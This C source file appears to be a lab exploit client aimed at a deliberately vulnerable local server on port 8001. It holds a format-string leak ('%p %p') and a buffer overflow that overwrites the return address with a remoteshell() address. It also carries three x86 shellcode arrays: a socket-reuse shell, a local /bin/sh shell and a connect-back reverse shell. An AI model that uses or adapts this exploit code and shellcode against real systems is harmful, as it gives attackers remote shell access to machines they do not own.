/*
 * Simple demonstration of talking to our vulnerable server
 */
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>

#define	PORTNUM	8001
#define	BLENGTH	256

// 169.254.12.90 = 0x5a78fea9

char buffer_addr[10];
int buffer_addr_offset;

char socketshellcode[] =
"\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x52\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0"
"\x0b\xcd\x80";

static char localshellcode[] =
"\xeb\x12\x5e\x31\xc0\x88\x46\x07"
"\x50\x56\x31\xd2\x89\xe1\x89\xf3"
"\xb0\x0b\xcd\x80\xe8\xe9\xff\xff"
"\xff\x2f\x62\x69\x6e\x2f\x73\x68";

char remoteshellcode[] =
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
        "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
        "\x68\x41\x42\x43\x44\x66\x68\xb0"
        "\xef\xb1\x02\x66\x51\x89\xe7\xb3"
        "\x10\x53\x57\x52\x89\xe1\xb3\x03"
        "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
        "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
        "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x50\x53\x89"
        "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
        "\x01\xcd\x80";

/* Send our name to the server */
static void
send_name(int s)
{
  char buffer[BLENGTH];
  char response_buffer[] = "%p %p Heres the value %p ";

  /* Receive a prompt from the server */
  recv(s, (void *)buffer, BLENGTH, MSG_WAITALL);

  /* Display the prompt to the user */
  fputs(buffer, stdout);

  /* Read a response from the user */
  //fgets(buffer, BLENGTH, stdin);
  
  /* Send the response to the server */
  send(s, (void *)response_buffer, BLENGTH, 0);

  /* Receive a reply from the server */
  recv(s, (void *)response_buffer, BLENGTH, MSG_WAITALL);

	
	memcpy( buffer_addr, &response_buffer[17], 10 );
	int buffer_addr_offset = (int)strtol(buffer_addr, NULL, 0);

  /* Display the reply to the user */
  fputs(response_buffer, stdout);
}

/* Send our message to the server */
static void
send_message(int s)
{
	int i;
	long *addr_ptr, addr;
	char buffer[BLENGTH];
	char *ptr;

	int reverseshell_addr = 0x8048a68; // location of the function remoteshell()
	//int reverseshell_addr = 0xb7e4e338; //address of message - 128.

	addr = (long)reverseshell_addr;
	//addr = buffer_addr_offset-128;
	//printf("Using address: 0x%x\n", addr);
	
	addr_ptr = (long *) buffer;
	// Set all words in the buffer start of the buffer whewre we place the exploit
	for (i = 0; i < BLENGTH; i+=4)
		*(addr_ptr++) = addr;
	/*
	// Set the start of the response buffer to NOP
	memset(buffer, 0x90, 8);
	
	//insert the shellcode after the NOPS
	ptr = buffer;
	ptr += 8;  
	for (i = 0; i < strlen(localshellcode); i++)
		*(ptr++) = localshellcode[i];
*/
	buffer[BLENGTH - 1] = '\0';

	/* Send the attack to the server */
	send(s, (void *)buffer, BLENGTH, 0);
}

/* Send our message to the server */
static void
send_message2(int s)
{
  char buffer[BLENGTH] = "ls\n";

  /* Display the prompt to the user */
  fputs(buffer, stdout);

  /* Read a response from the user */
  fgets(buffer, BLENGTH, stdin);

  /* Send the response to the server */
  send(s, (void *)buffer, BLENGTH, 0);
}

/* Connect and talk to the server */
int
main()
{
  struct sockaddr_in server;
  struct hostent *host;
  int s;

  /* Create an Internet family, stream socket */
  s = socket(AF_INET, SOCK_STREAM, 0);

  /* Did that work? */
  if (s < 0) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }

  /* We are running the server on localhost for the minute */
  if ((host = gethostbyname("localhost")) == NULL) {
    perror("gethostbyname()");
    exit(EXIT_FAILURE);
  }

  /* Fill in the socket address structure */
  memset((char *)&server, '\0', sizeof (server));
  server.sin_family = AF_INET;
  server.sin_port = htons(PORTNUM);
  memcpy((char *)&server.sin_addr, host->h_addr_list[0], host->h_length);

  /* Connect to the server */
  if (connect(s, (struct sockaddr *)&server, sizeof (server)) < 0) {
    perror("connect()");
    exit(EXIT_FAILURE);
  }

  /* Send our name first */
  send_name(s);

  /* Now send a message */
  send_message(s);
send_message2(s);
  /* Close the socket */
  close(s);

  return (0);
}
